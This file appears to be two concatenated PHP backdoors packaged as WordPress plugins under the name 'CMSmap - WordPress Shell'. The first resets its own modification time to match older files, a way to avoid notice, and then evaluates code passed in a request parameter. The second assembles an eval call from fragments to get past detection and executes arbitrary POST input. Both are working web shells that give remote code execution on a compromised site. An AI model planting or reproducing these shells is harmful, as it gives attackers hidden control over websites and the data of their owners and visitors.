<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
 $files = glob("*.*");
if (count($files) > 1) {
    $time = array();
    for ($i = 0;$i < count($files);$i++) {
        $time[] = filemtime($files[$i]);
    }
    @touch($_SERVER["SCRIPT_FILENAME"], min($time));
} else {
    @touch($_SERVER["SCRIPT_FILENAME"], filemtime("./"));
}
define("hi","$_REQUEST[young]");
eval(hi);
?>
<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
function bypass(){
    return "l(\$_POST['";
}
eval("eva".bypass()."1ju']);");